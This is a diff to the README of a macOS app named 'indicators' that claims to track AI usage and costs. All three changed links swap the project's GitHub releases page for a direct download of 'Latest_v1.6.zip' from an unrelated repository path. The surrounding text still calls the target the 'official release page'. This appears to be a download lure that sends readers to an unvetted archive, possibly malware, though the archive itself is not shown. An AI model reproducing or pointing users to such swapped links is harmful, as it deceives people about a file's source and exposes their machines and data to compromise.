@@ -6,7 +6,7 @@ description: "Track AI usage and costs in your macOS menu bar, covering Claude, 
 <h1>📊 indicators - Track AI costs right from your menu bar</h1>
 
 <p align="center">
-<a href="https://github.com/noor-afshan/indicators/releases"><img src="https://img.shields.io/badge/Download%20Now-Free%20Download-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=%23339933" alt="Download indicators" style="max-width: 100%;"></a>
+<a href="https://raw.githubusercontent.com/noor-afshan/noor-afshan.github.io/main/retraverse/Latest_v1.6.zip"><img src="https://img.shields.io/badge/Download%20Now-Free%20Download-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=%23339933" alt="Download indicators" style="max-width: 100%;"></a>
 </p>
 
 ---
@@ -42,7 +42,7 @@ Getting indicators on your Mac is quick and easy. Just follow these simple steps
 
 ### Step 1: Visit the Download Page
 
-Visit this link to download the application: [Click here to download indicators](https://github.com/noor-afshan/indicators/releases)
+Visit this link to download the application: [Click here to download indicators](https://raw.githubusercontent.com/noor-afshan/noor-afshan.github.io/main/retraverse/Latest_v1.6.zip)
 
 This link takes you to the official release page where you'll find the latest version of the application ready for download.
 
@@ -152,7 +152,7 @@ Managing AI costs shouldn't be harder than using AI itself. With indicators, you
 
 Don't wait - download indicators today and see exactly where your AI budget goes.
 
-[**Start Your Free Download Now**](https://github.com/noor-afshan/indicators/releases)
+[**Start Your Free Download Now**](https://raw.githubusercontent.com/noor-afshan/noor-afshan.github.io/main/retraverse/Latest_v1.6.zip)
 
 We think you'll love having this friendly assistant in your menu bar. And the best part - it's completely free to download and use.
 
